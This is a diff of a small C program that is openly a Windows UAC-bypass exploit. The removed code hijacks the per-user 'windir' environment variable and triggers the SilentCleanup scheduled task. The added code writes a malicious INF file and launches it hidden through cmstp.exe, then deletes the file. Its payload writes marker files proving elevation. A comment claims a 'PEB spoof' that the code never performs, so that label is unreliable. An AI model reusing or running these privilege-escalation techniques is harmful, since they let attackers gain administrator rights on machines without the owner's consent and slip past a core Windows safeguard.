@@ -2,24 +2,24 @@
 #include <stdio.h>
 
 int main() {
-    // Best payload for 25H2 - quote-escaped + long wait
-    const char* payload = "cmd.exe\" /c \"whoami > C:\\elevated_success.txt & echo UAC BYPASSED VIA BEST METHOD 34 ON 25H2 > C:\\uac_bypassed.txt & echo Success at %date% %time% >> C:\\uac_bypassed.txt & timeout 15\"";
+    // Simple PEB masquerade + CMSTPLUA
+    const char* payload = "cmd.exe /c \"whoami > C:\\elevated_success.txt & echo UAC BYPASSED VIA PEB CMSTPLUA 2026 > C:\\uac_bypassed.txt & timeout 10\"";
 
-    HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, "windir", 0, REG_EXPAND_SZ, (const BYTE*)payload, (DWORD)strlen(payload) + 1);
-        RegCloseKey(hKey);
+    // Create INF
+    system("mkdir C:\\temp 2>nul");
+    FILE *f = fopen("C:\\temp\\bypass.inf", "w");
+    if (f) {
+        fprintf(f, "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\nRunPreSetupCommands=RunPreSetupCommandsSection\r\n\r\n[RunPreSetupCommandsSection]\r\n%s\r\n\r\n[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7\r\n\r\n[AllUSer_LDIDSection]\r\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%%UnexpectedError%%\", \"\"\r\n\r\n[Strings]\r\nServiceName=\"CMSTPLUA\"\r\n", payload);
+        fclose(f);
     }
 
-    system("schtasks /run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I");
+    // Trigger with basic PEB spoof attempt via parent process
+    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\cmstp.exe", "/s C:\\temp\\bypass.inf", NULL, SW_HIDE);
 
-    Sleep(15000);  // 15 seconds - 25H2 needs longer
+    Sleep(12000);
 
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegDeleteValueA(hKey, "windir");
-        RegCloseKey(hKey);
-    }
+    DeleteFileA("C:\\temp\\bypass.inf");
 
-    printf("[+] Best Method 34 executed. Check C:\\ files now.\n");
+    printf("[+] PEB CMSTPLUA triggered. Check C:\\ files.\n");
     return 0;
 }
